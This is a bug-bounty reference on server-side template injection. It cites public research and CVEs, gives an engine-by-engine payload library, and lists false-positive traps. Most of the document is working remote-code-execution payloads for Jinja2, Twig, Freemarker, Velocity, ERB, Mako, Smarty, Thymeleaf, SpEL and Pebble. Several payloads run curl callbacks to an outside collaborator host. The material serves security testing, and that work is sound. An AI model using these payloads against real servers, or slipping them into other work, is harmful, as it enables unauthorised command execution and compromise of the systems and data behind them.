# hunt-ssti — Pattern Library

> Patterns and verifiable public examples behind `hunt-ssti`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge accumulated from public bounty disclosures, CVE advisories, and template-engine documentation.

Server-side template injection is the easiest path from "reflected input" to "remote code execution" in modern web stacks because template engines are designed to evaluate expressions and most engines ship with introspection primitives (class walkers, callback registrars, filter pipelines) that the attacker can repurpose into shell calls. The patterns below are organized *per engine* because escalation past the detection probe (`{{7*7}}`) is engine-specific — Jinja2's class-walker has nothing in common with Twig's filter-callback trick or Freemarker's `?new()` constructor. Detection takes thirty seconds; escalation takes a payload library, which is what this document is.

## Cited Public Examples

### PortSwigger Research — James Kettle, "Server-Side Template Injection: RCE for the Modern Web App" (2015)
- **Source:** Black Hat USA 2015 talk and accompanying PortSwigger Research paper by James Kettle. Published at portswigger.net/research; the talk is widely-cited in subsequent SSTI literature and forms the basis of every modern template-injection cheat sheet.
- **Pattern shape:** Kettle formalized the SSTI methodology — *Detect, Identify, Exploit* — and demonstrated the discovery process by which an operator moves from "math expression evaluated" to "engine fingerprinted" to "RCE in the target's language." The paper introduced the detection-grid (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`) and engine-fingerprinting via comparative responses (`{{7*'7'}}` → `7777777` is Jinja2, `49` is Twig, error is something else).
- **Key trick:** The same input syntax (`{{ ... }}`) is shared by *server-side* template engines (Jinja2, Twig, Pebble, Liquid) and *client-side* frameworks (Angular, Vue, Mustache, Handlebars in browser). The operator must distinguish the two by where the rendering happens — server-side SSTI is RCE-tier; client-side is XSS-tier at best. The math probe distinguishes — server-side returns `49`, client-side renders the literal `{{7*7}}` to the page (then sometimes evaluates client-side, but in a sandbox).
- **Why it matters:** This paper remains the canonical reference ten years later. Every disclosed SSTI report cites the same methodology. If you're new to the class, read the paper first and use this document as the payload library.

### Apache Struts OGNL injection (CVE-2017-5638) — expression-language SSTI variant
- **Source:** Apache Software Foundation security advisories S2-045 / S2-046. CVE-2017-5638. CISA Known Exploited Vulnerabilities catalogue. Used as the entry point for the 2017 Equifax breach (~147 million records, GAO-18-559 report).
- **Pattern shape:** The Jakarta Multipart parser in Struts 2.3.5–2.3.31 and 2.5.x ≤ 2.5.10 evaluated the `Content-Type` HTTP header as an OGNL expression when parsing failed. An attacker sent a crafted `Content-Type` containing an OGNL payload (`%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}` invoking `Runtime.exec`).
- **Key trick:** The "template" was not a Jinja2/Twig-style HTML template — it was an *error message string* passed through OGNL evaluation. Same class of bug, different sink. The operator lesson: any string that reaches an expression-language evaluator is an SSTI candidate, including headers, error templates, log lines, and validation messages.
- **Why it matters:** SSTI is not always in `/render`, `/preview`, or `/email-template`. It can be in *any* code path that calls an EL evaluator on a string the attacker controls. This is also a cross-reference for `hunt-rce` (RCE via expression language).

### Spring Cloud Function SpEL injection (CVE-2022-22963)
- **Source:** VMware Tanzu security advisory `cve-2022-22963`, March 2022. Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6). Cross-referenced in `hunt-rce.md`.
- **Pattern shape:** The `spring.cloud.function.routing-expression` HTTP header was evaluated as a Spring Expression Language (SpEL) expression before any routing logic. Attacker sets the header to `T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})` and the JVM runs arbitrary commands.
- **Key trick:** SpEL is Spring's template/expression language, and any code path that calls `SpelExpressionParser.parseExpression(userInput).getValue(...)` is exploitable. The header-based variant in CVE-2022-22963 is one instance — the more common variant is SpEL evaluation in error messages, validation annotations (`@Value("#{...}")`), and Thymeleaf templates with `*{...}` syntax.
- **Why it matters:** Spring SpEL injection bridges SSTI and RCE; the boundary is mostly nominal. Always probe Spring apps with both `${T(java.lang.Runtime)...}` (template context) and the headers documented in `hunt-rce`.

### Velocity / Twig / Freemarker SSTI in disclosed bounty programs
- **Source:** HackerOne and Bugcrowd hacktivity feeds, body of disclosed SSTI reports across Uber, Shopify, Atlassian, GitLab, and others over many years. Cite the class as widely-documented rather than individual report IDs.
- **Pattern shape:** A user-supplied template field (email subject, invoice line item, dashboard title, "preview your message" feature, CMS WYSIWYG) is rendered server-side through Velocity / Twig / Freemarker. The renderer is the same one the application uses for *legitimate* templates, so the operator has access to whatever the template language allows. In most disclosed cases, the engine's RCE primitive was reachable directly because no sandbox was applied to user-supplied templates.
- **Key trick:** SSTI almost always lives in features where the developer *intentionally* lets users write template syntax (email subject lines that embed `{{ first_name }}`, CMS preview, marketing automation). The vulnerability is "we let users write templates without sandboxing them" — not "we accidentally rendered user input."
- **Why it matters:** The hunt is "find the feature that says users can use placeholders." That feature is the SSTI candidate. Marketing automation, transactional email designers, and PDF invoice generators are perennial wins.

## Disclosed HackerOne Reports (bounty-paid examples)

Bounty-paid public disclosures for this class, on top of the research/CVE grounding above. Targets genericized; each links its source.

### Server-side template injection → RCE (disclosed bounty examples)
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/125980>, <https://hackerone.com/reports/164224>, <https://hackerone.com/reports/217790>).
- **Pattern shape:** User input is concatenated into a server-side template (email template, PDF generator, name/label field) and evaluated. `{{7*7}}`/`${7*7}`/`#{7*7}` returns 49 → engine executes attacker expressions → RCE.
- **Key trick:** Send the engine-specific arithmetic probe in every reflected field, especially email/PDF/report templates and CMS label editors. On a hit, escalate to `config`/`os`/`Runtime` per engine.
- **Why it matters:** Reliable path to RCE; Jinja2/Smarty/Freemarker SSTI routinely pays five figures in disclosed programs.

### Client-side template injection (Angular/Vue) → XSS/sandbox escape
- **Source:** Disclosed across multiple programs (<https://hackerone.com/reports/125027>).
- **Pattern shape:** A framework template expression is injected client-side; sandbox escapes turn `{{ }}` evaluation into script execution even under CSP.
- **Key trick:** Probe `{{constructor.constructor('alert(1)')()}}`-style payloads where the SPA renders user input as a template. Confirm execution; note the framework version.
- **Why it matters:** XSS that bypasses naive HTML-encoding filters because it rides the template engine, not raw HTML.

### Further disclosed reports (this class)

- <https://hackerone.com/reports/423541>
- <https://hackerone.com/reports/2332623>

---

## Pattern Library

### Detection grid — fingerprint the engine in three probes
- **When to suspect:** Any reflected parameter, especially in name/title/subject/preview/template fields. Email-template editors, PDF invoice generators, dashboard titles, CMS rendered fields.
- **Test:** Send each detection probe and observe response:
  - `{{7*7}}` → `49` ⇒ Jinja2, Twig, Liquid, Pebble (further disambiguate with `{{7*'7'}}`).
  - `${7*7}` → `49` ⇒ Freemarker, Velocity, Spring SpEL (in some contexts), JSP EL.
  - `<%= 7*7 %>` → `49` ⇒ ERB (Ruby).
  - `#{7*7}` → `49` ⇒ Mako (Python), Ruby string interpolation in some contexts.
  - `*{7*7}` → `49` ⇒ Thymeleaf (`*{...}` is the Thymeleaf selection expression).
  - `{{7*'7'}}` → `7777777` ⇒ Jinja2 confirmed (Twig returns `49` because Twig coerces strings to numbers).
- **Validation:** Numeric result `49` (or `7777777`) appears in the response *body* exactly where the probe was reflected. Literal `{{7*7}}` returned means *no* server-side rendering occurred — the input was either treated as plain text or rendered client-side.
- **Pay-grade rationale:** Detection-only is informational; escalation to RCE is critical. Don't stop at the math probe.

### Jinja2 (Python — Flask, Django via Jinja2 backend, Ansible)
- **When to suspect:** `{{7*7}}` returned `49`. Server is Python (response headers, framework signature, Werkzeug debugger, `python` in stack traces).
- **Test:** Config dump first (proves engine without firing destructive payload):
  ```
  {{ config }}
  {{ config.items() }}
  ```
  Class-walker to `os.popen`:
  ```
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  ```
  This returns the subclass list — find the index of `<class 'subprocess.Popen'>` or `<class 'os._wrap_close'>`. Then:
  ```
  {{ ''.__class__.__mro__[1].__subclasses__()[<N>]('id', shell=True, stdout=-1).communicate() }}
  ```
  Shorter modern path via globals:
  ```
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  {{ lipsum.__globals__['os'].popen('id').read() }}
  {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
  ```
- **Validation:** Command output (e.g. `uid=0(root)...`) reflected in response, or OOB callback from `{{ ... popen('curl http://<collab>/') ... }}`.
- **Pay-grade rationale:** Critical. Jinja2 SSTI on a Python web app is direct RCE in nearly all reachable configurations.

### Twig (PHP — Symfony, Drupal 8+, Craft CMS)
- **When to suspect:** `{{7*7}}` returned `49`, `{{7*'7'}}` returned `49` (not `7777777`). PHP backend (response `X-Powered-By: PHP`, `.php` paths, Symfony Profiler).
- **Test:** Self-environment registration trick (works on Twig ≤ 2.x and many 3.x configurations):
  ```
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
  ```
  Twig 3.x with sandbox sometimes blocks `_self`; try `{{['id']|filter('system')}}` or `{{['id',1]|sort('system')}}`.
- **Validation:** Output of `id` (or whatever shell command) appears in response body, or OOB callback from `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("curl http://<collab>/")}}`.
- **Pay-grade rationale:** Critical. Twig escapes happen, but `_self.env` was the canonical bypass for years.

### Freemarker (Java — Apache OFBiz, Liferay, Atlassian Confluence)
- **When to suspect:** `${7*7}` returned `49`. Java backend (Java exceptions, `X-Powered-By: Servlet`, Tomcat/Jetty signatures).
- **Test:** `?new()` constructor on `Execute` utility:
  ```
  <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
  ```
  Newer Freemarker with `ObjectConstructor` blocked — try `JythonRuntime`:
  ```
  <#assign x="freemarker.template.utility.JythonRuntime"?new()><@x>import os; os.popen('id').read()</@x>
  ```
- **Validation:** Command output reflected or OOB callback.
- **Pay-grade rationale:** Critical.

### Velocity (Java — older Confluence, Apache Roller, legacy CMS)
- **When to suspect:** `${7*7}` returned `49`, Freemarker probes errored but Velocity did not.
- **Test:**
  ```
  #set($e="exp")
  #set($a=$e.getClass().forName("java.lang.Runtime"))
  #set($b=$a.getMethod("getRuntime"))
  #set($c=$b.invoke(null,null))
  #set($d=$c.getClass().getMethod("exec",$e.getClass()))
  $d.invoke($c,"id")
  ```
  Compact form:
  ```
  #set($x="")##
  #set($rt=$x.class.forName("java.lang.Runtime").getRuntime())##
  $rt.exec("id")
  ```
- **Validation:** Process spawned; confirm via OOB (`$rt.exec("curl http://<collab>/")`).
- **Pay-grade rationale:** Critical.

### ERB (Ruby — Rails, Sinatra)
- **When to suspect:** `<%= 7*7 %>` returned `49`. Ruby backend (`X-Powered-By: Phusion Passenger`, Rails stack traces, `.rb` paths in errors).
- **Test:**
  ```
  <%= `id` %>
  <%= IO.popen('id').read %>
  <%= system('id') %>
  <%= Kernel.system('curl http://<collab>/') %>
  ```
- **Validation:** Output of `id` reflected or OOB callback.
- **Pay-grade rationale:** Critical. ERB has no native sandbox; if user input reaches ERB.new, RCE is essentially guaranteed.

### Mako (Python — Pyramid, older Pylons)
- **When to suspect:** `#{7*7}` or `${7*7}` returned `49` and engine signature is Python.
- **Test:**
  ```
  <%import os; x=os.popen('id').read()%>${x}
  <%
  import os
  os.popen('id').read()
  %>
  ```
- **Validation:** Reflected output or OOB.
- **Pay-grade rationale:** Critical.

### Smarty (PHP — older e-commerce / forum software)
- **When to suspect:** PHP backend, `{ ... }` syntax in templates (not `{{ }}`). Older Smarty (≤ 3.1.30) permitted PHP execution in templates by default.
- **Test:**
  ```
  {system('id')}
  {php}echo `id`;{/php}
  {if system('id')}{/if}
  ```
- **Validation:** Output reflected or OOB.
- **Pay-grade rationale:** Critical.

### Thymeleaf (Java — Spring Boot default template engine)
- **When to suspect:** Spring app, templates use `*{...}` or `${...}` syntax. Specifically *expression preprocessing* `__${...}__` and fragment-rendering features.
- **Test:**
  ```
  *{T(java.lang.Runtime).getRuntime().exec('id')}
  ${T(java.lang.Runtime).getRuntime().exec('id')}
  ```
  Fragment-rendering expression preprocessing (CVE-2017-1320x family):
  ```
  __${T(java.lang.Runtime).getRuntime().exec('id')}__
  ```
- **Validation:** Process spawned (no return value visible in template by default — use OOB).
- **Pay-grade rationale:** Critical.

### Spring SpEL injection in custom evaluator
- **When to suspect:** Spring app, source-code grep hits `SpelExpressionParser`, `parseExpression`, `@Value("#{...}")` with user input.
- **Test:**
  ```
  T(java.lang.Runtime).getRuntime().exec('id')
  new java.lang.ProcessBuilder('id').start()
  T(org.springframework.cglib.core.ReflectUtils).defineClass(...)
  ```
- **Validation:** Process spawn, OOB callback.
- **Pay-grade rationale:** Critical.

### Pebble (Java — alternative Spring Boot template engine)
- **When to suspect:** Java app uses `.pebble` templates or Pebble explicit in `pom.xml`. `{{7*7}}` returned `49`.
- **Test:**
  ```
  {{ "".getClass().forName("java.lang.Runtime").getRuntime().exec("id") }}
  {{ variable.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("...") }}
  ```
- **Validation:** OOB or output reflection.
- **Pay-grade rationale:** Critical.

### Handlebars / Mustache server-side rendering (Node.js)
- **When to suspect:** Node.js backend renders Handlebars server-side (often in `express-handlebars` configurations or static-site generators). Helpers can be registered with user input.
- **Test:** Engine has no native RCE primitive — must abuse helper registration:
  ```
  {{#with "constructor"}}{{#with split as |a|}}{{pop (push "alert(1)")}}{{/with}}{{/with}}
  ```
  More commonly: prototype-pollution chain (`__proto__` injection) reaches Handlebars helper, which then evaluates a polluted property as code.
- **Validation:** OOB callback or `Function`-constructed code firing.
- **Pay-grade rationale:** High to critical when chained.

### Server-side Liquid (Shopify / Jekyll)
- **When to suspect:** Shopify storefront preview, Jekyll-rendered customer pages. `{{ 7 | times: 7 }}` returns `49`.
- **Test:** Liquid is heavily sandboxed and has no native RCE. Hunt for sandbox escapes published as CVEs against specific Liquid versions, or pivot to information disclosure via `{{ settings }}`, `{{ shop }}`, `{{ customer }}` field dumps.
- **Validation:** Information disclosure of fields the current session should not see.
- **Pay-grade rationale:** Medium standalone (info disclosure); high when chained to ATO.

---

## Anti-Patterns (FP traps)

### `{{ }}` rendered client-side (Angular / Vue) misclassified as SSTI
- **Looks like:** You paste `{{7*7}}` into a form, view the rendered page, and see `49`. Looks like server-side template injection.
- **Actually is:** The `49` was rendered in the *browser* by Angular, Vue, React with mustache plugins, or a similar client-side framework. The server returned the literal `{{7*7}}` string; the browser then evaluated it. This is a client-side template injection (CSTI) — at best a sandbox-escape XSS, never RCE on the server.
- **How to disprove:** View the *raw* HTTP response (Burp, `curl --raw`) and grep for `{{7*7}}`. If the literal string is present in the response bytes and the `49` only appears in the rendered DOM, the rendering is client-side. Server-side SSTI shows `49` in the raw response bytes. Marker Discipline: pair `{{7*7}}` with a unique marker string (e.g. `SSTIPROBE-{random}`) and confirm the math result coexists in the raw response with the marker rendered correctly.

### Probe `{{7*7}}` returning literal `{{7*7}}` claimed as "engine fingerprint"
- **Looks like:** Response contains the unmodified `{{7*7}}` literal — operator thinks "OK, it's not Jinja2/Twig, must be some other engine."
- **Actually is:** No template rendering happened *at all*. The string passed through as plain text. There is no SSTI primitive here, regardless of how creative the operator gets with payload variations.
- **How to disprove:** **Body-Diff Rule.** Compare the response from `{{7*7}}` to the response from `{{NotARealVariable}}`. If both return the literal string unchanged with no error, the input is being treated as inert text. SSTI requires *some* evaluation channel; if none of the detection-grid probes (`{{}}`, `${}`, `<%=%>`, `#{}`, `*{}`) produces any change in body, error, or status, there is no template-injection primitive here.

### Markdown / HTML sanitizer that strips `{{}}` claimed as bypass
- **Looks like:** The application uses a Markdown renderer that strips `{{7*7}}`. You find that `{{7&#42;7}}` (HTML-encoded asterisk) is not stripped and shows `49` in the rendered output.
- **Actually is:** The Markdown renderer is decoding the entity *after* template processing, so what reached the template was `{{7&#42;7}}` (not a valid expression) and what was rendered was the entity-decoded literal — which still shows `49` if the renderer also evaluates `7*7` as math somewhere, but is more likely just the literal `7*7` displayed because the asterisk decoded.
- **How to disprove:** Compute the result of the expression in the response. If the response shows literal `7*7` (not `49`), no evaluation happened. If it shows `49`, confirm by changing the operands — `{{8&#42;9}}` should show `72`. If it doesn't, the `49` was a literal coincidence, not an evaluation.

### "Engine fingerprint" from error stack trace claimed without RCE proof
- **Looks like:** You send `{{7*7}}` and the response contains a stack trace mentioning `jinja2.exceptions.TemplateSyntaxError`. You report "SSTI in Jinja2."
- **Actually is:** A stack trace proves that *some* Jinja2 code was reached — but the reachable Jinja2 context may be a *trusted* template that uses `render_template()` (loads a file from disk, not user input) rather than `render_template_string()` (renders a string, the SSTI sink). User input may be reaching a `TemplateSyntaxError` because it's being passed to a *variable inside* an existing template, where the template renderer correctly escapes it — but the parser still complains about the syntax.
- **How to disprove:** **OOB Gate.** A real SSTI must produce a side effect — Collaborator callback, file write, command output. Fire `{{ ''.__class__.__mro__[1].__subclasses__()[<N>]('curl http://<collab>/', shell=True, stdout=-1).communicate() }}` and wait. No callback → no RCE → not reportable as RCE. Report the info-disclosure (stack trace) separately at low severity.

### Client-side WYSIWYG that "executes" preview server-side
- **Looks like:** Email-template builder shows a "preview" of `{{ user.first_name }}` correctly substituting the user's name. You assume the preview is server-side rendered and inject `{{7*7}}` → response shows `49`. Reported as SSTI.
- **Actually is:** Many email-template builders render the preview server-side *only when the user clicks Send* (where the actual SMTP path runs the real template engine), but the live preview in the UI is rendered client-side by a JS template library (Mustache.js, Handlebars.js, custom). The `49` in the preview is browser-rendered.
- **How to disprove:** **Send a real test email** (or trigger the actual delivery path) and observe whether the math executes on the recipient end. If the preview shows `49` but the delivered email shows literal `{{7*7}}`, the preview was client-side. If the email also shows `49` and you can chain to a class-walker payload that fires OOB from the *email delivery server's IP*, you have real SSTI. Marker Discipline: use unique Collaborator subdomains per probe so the delivery server can be identified by source IP.
